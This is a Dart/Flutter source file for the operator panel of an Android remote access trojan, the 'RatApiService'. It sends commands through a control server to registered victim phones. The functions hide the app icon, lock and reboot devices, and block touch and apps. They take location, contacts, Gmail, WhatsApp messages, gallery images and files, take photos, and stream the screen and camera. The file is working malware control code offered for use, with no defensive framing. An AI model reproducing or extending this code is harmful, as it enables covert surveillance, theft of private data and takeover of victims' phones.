// lib/services/rat_api_service.dart
import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import '../utils/constants.dart';
import '../models/command_model.dart';

class RatApiService {
  static final RatApiService _instance = RatApiService._internal();
  factory RatApiService() => _instance;
  RatApiService._internal();

  // ============================================================
  //  BASE REQUEST
  // ============================================================
  Future<Map<String, dynamic>> _request(
    String endpoint, {
    String method = 'GET',
    Map<String, dynamic>? body,
    Map<String, String>? headers,
    bool useAuth = true,
  }) async {
    final url = Uri.parse('${AppConstants.apiBaseUrl}$endpoint');
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('token') ?? '';

    final defaultHeaders = {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
    };

    if (useAuth && token.isNotEmpty) {
      defaultHeaders['Authorization'] = 'Bearer $token';
    }

    if (headers != null) {
      defaultHeaders.addAll(headers);
    }

    try {
      late http.Response response;

      switch (method.toUpperCase()) {
        case 'GET':
          response = await http.get(url, headers: defaultHeaders);
          break;
        case 'POST':
          response = await http.post(
            url,
            headers: defaultHeaders,
            body: body != null ? jsonEncode(body) : null,
          );
          break;
        case 'PUT':
          response = await http.put(
            url,
            headers: defaultHeaders,
            body: body != null ? jsonEncode(body) : null,
          );
          break;
        case 'DELETE':
          response = await http.delete(url, headers: defaultHeaders);
          break;
        default:
          return {'success': false, 'message': 'Method not supported'};
      }

      final data = jsonDecode(response.body);
      return data;
    } catch (e) {
      return {'success': false, 'message': 'Network error: $e'};
    }
  }

  // ============================================================
  //  SEND COMMAND
  // ============================================================
  Future<Map<String, dynamic>> sendCommand({
    required String deviceId,
    required String command,
    String? extra,
  }) async {
    return _request(
      '/rat/command',
      method: 'POST',
      body: {
        'deviceId': deviceId,
        'command': command,
        'extra': extra ?? '',
      },
    );
  }

  // ============================================================
  //  GET COMMAND STATUS
  // ============================================================
  Future<Map<String, dynamic>> getCommandStatus(String commandId) async {
    return _request('/rat/command/$commandId');
  }

  // ============================================================
  //  GET COMMAND HISTORY
  // ============================================================
  Future<List<CommandModel>> getCommandHistory(String deviceId) async {
    try {
      final result = await _request('/rat/history/$deviceId');
      if (result['success'] == true) {
        final list = result['history'] ?? [];
        return list.map((c) => CommandModel.fromJson(c)).toList();
      }
      return [];
    } catch (e) {
      return [];
    }
  }

  // ============================================================
  //  DEVICE CONTROL
  // ============================================================
  // ── FLASHLIGHT ──
  Future<Map<String, dynamic>> flashlight(String deviceId, bool on) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'flashlight',
      extra: on ? 'on' : 'off',
    );
  }

  // ── LOCK DEVICE ──
  Future<Map<String, dynamic>> lockDevice(String deviceId, {String? pin}) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'lockDevice',
      extra: pin ?? '0000',
    );
  }

  // ── UNLOCK DEVICE ──
  Future<Map<String, dynamic>> unlockDevice(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'unlockDevice',
    );
  }

  // ── HIDE ICON ──
  Future<Map<String, dynamic>> hideIcon(String deviceId, bool hide) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'hideIcon',
      extra: hide ? 'true' : 'false',
    );
  }

  // ── VIBRATE ──
  Future<Map<String, dynamic>> vibrate(String deviceId, int duration) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'vibrate',
      extra: duration.toString(),
    );
  }

  // ── MUTE VOLUME ──
  Future<Map<String, dynamic>> muteVolume(String deviceId, bool mute) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'muteVolume',
      extra: mute ? 'true' : 'false',
    );
  }

  // ── SHOW TOAST ──
  Future<Map<String, dynamic>> showToast(String deviceId, String message) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'showToast',
      extra: message,
    );
  }

  // ── JUMPSCARE ──
  Future<Map<String, dynamic>> jumpscare(String deviceId, bool on) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'jumpscare',
      extra: on ? 'true' : 'false',
    );
  }

  // ── TEXT TO SPEECH ──
  Future<Map<String, dynamic>> ttsSpeak(String deviceId, String text) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'ttsSpeak',
      extra: text,
    );
  }

  // ── DIALOG SPAM ──
  Future<Map<String, dynamic>> dialogSpam(String deviceId, String text) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'dialogSpam',
      extra: text,
    );
  }

  // ── TOUCH BLOCK ──
  Future<Map<String, dynamic>> touchBlock(String deviceId, int duration) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'touchBlock',
      extra: duration.toString(),
    );
  }

  // ── REBOOT ──
  Future<Map<String, dynamic>> reboot(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'reboot',
    );
  }

  // ── SHUTDOWN ──
  Future<Map<String, dynamic>> shutdown(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'shutdown',
    );
  }

  // ── BLOCK APP ──
  Future<Map<String, dynamic>> blockApp(String deviceId, String package) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'blockApp',
      extra: package,
    );
  }

  // ── UNBLOCK APP ──
  Future<Map<String, dynamic>> unblockApp(String deviceId, String package) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'unblockApp',
      extra: package,
    );
  }

  // ── UNBLOCK ALL ──
  Future<Map<String, dynamic>> unblockAllApps(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'unblockAll',
    );
  }

  // ============================================================
  //  DATA GRAB
  // ============================================================
  // ── GET LOCATION ──
  Future<Map<String, dynamic>> getLocation(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'getLocation',
    );
  }

  // ── GET CONTACTS ──
  Future<Map<String, dynamic>> getContacts(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'getContacts',
    );
  }

  // ── GET GMAIL ──
  Future<Map<String, dynamic>> getGmail(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'getGmail',
    );
  }

  // ── GET WHATSAPP ──
  Future<Map<String, dynamic>> getWhatsApp(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'getWhatsApp',
    );
  }

  // ── GET GALLERY ──
  Future<Map<String, dynamic>> getGallery(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'getGallery',
    );
  }

  // ── GET PHONE INFO ──
  Future<Map<String, dynamic>> getPhoneInfo(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'getPhoneInfo',
    );
  }

  // ── GET INSTALLED APPS ──
  Future<Map<String, dynamic>> getInstalledApps(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'getInstalledApps',
    );
  }

  // ── GET FILES ──
  Future<Map<String, dynamic>> getFiles(String deviceId, String path) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'getFiles',
      extra: path,
    );
  }

  // ── TAKE PHOTO ──
  Future<Map<String, dynamic>> takePhoto(String deviceId, String facing) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'takePhoto',
      extra: facing,
    );
  }

  // ============================================================
  //  STREAM
  // ============================================================
  // ── START SCREEN STREAM ──
  Future<Map<String, dynamic>> startScreenStream(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'startScreenStream',
    );
  }

  // ── STOP SCREEN STREAM ──
  Future<Map<String, dynamic>> stopScreenStream(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'stopScreenStream',
    );
  }

  // ── START CAMERA STREAM ──
  Future<Map<String, dynamic>> startCameraStream(String deviceId, String facing) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'startCameraStream',
      extra: facing,
    );
  }

  // ── STOP CAMERA STREAM ──
  Future<Map<String, dynamic>> stopCameraStream(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'stopCameraStream',
    );
  }

  // ============================================================
  //  MEDIA
  // ============================================================
  // ── SET WALLPAPER ──
  Future<Map<String, dynamic>> setWallpaper(String deviceId, String url) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'setWallpaper',
      extra: url,
    );
  }

  // ── PLAY AUDIO ──
  Future<Map<String, dynamic>> playAudio(String deviceId, String url) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'playAudio',
      extra: url,
    );
  }

  // ── STOP AUDIO ──
  Future<Map<String, dynamic>> stopAudio(String deviceId) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'stopAudio',
    );
  }

  // ── OPEN URL ──
  Future<Map<String, dynamic>> openUrl(String deviceId, String url) async {
    return sendCommand(
      deviceId: deviceId,
      command: 'openUrl',
      extra: url,
    );
  }

  // ============================================================
  //  WEBRTC STREAMING
  // ============================================================
  Future<Map<String, dynamic>> startWebRTCStream({
    required String deviceId,
    required String signalingUrl,
    required String turnUrl,
    required String turnUsername,
    required String turnPassword,
  }) async {
    return _request(
      '/rat/webrtc/start',
      method: 'POST',
      body: {
        'deviceId': deviceId,
        'signalingUrl': signalingUrl,
        'turnUrl': turnUrl,
        'turnUsername': turnUsername,
        'turnPassword': turnPassword,
      },
    );
  }

  Future<Map<String, dynamic>> stopWebRTCStream(String deviceId) async {
    return _request(
      '/rat/webrtc/stop',
      method: 'POST',
      body: {'deviceId': deviceId},
    );
  }

  // ============================================================
  //  DEVICE REGISTRATION
  // ============================================================
  Future<Map<String, dynamic>> registerDevice({
    required String name,
    required String uid,
    String? model,
    String? brand,
  }) async {
    return _request(
      '/rat/register',
      method: 'POST',
      body: {
        'name': name,
        'uid': uid,
        'model': model ?? '',
        'brand': brand ?? '',
      },
    );
  }

  // ============================================================
  //  DEVICE MANAGEMENT
  // ============================================================
  Future<Map<String, dynamic>> getDevices() async {
    return _request('/rat/devices');
  }

  Future<Map<String, dynamic>> getDevice(String deviceId) async {
    return _request('/rat/devices/$deviceId');
  }

  Future<Map<String, dynamic>> deleteDevice(String deviceId) async {
    return _request(
      '/rat/devices/$deviceId',
      method: 'DELETE',
    );
  }

  Future<Map<String, dynamic>> updateDevice(
    String deviceId,
    Map<String, dynamic> data,
  ) async {
    return _request(
      '/rat/devices/$deviceId',
      method: 'PUT',
      body: data,
    );
  }

  // ============================================================
  //  RESPONSE HANDLER
  // ============================================================
  Map<String, dynamic> handleResponse(Map<String, dynamic> response) {
    if (response['success'] == true) {
      return {
        'success': true,
        'data': response['data'] ?? {},
        'message': response['message'] ?? 'Success',
      };
    } else {
      return {
        'success': false,
        'message': response['message'] ?? 'Failed',
        'error': response['error'] ?? '',
      };
    }
  }
}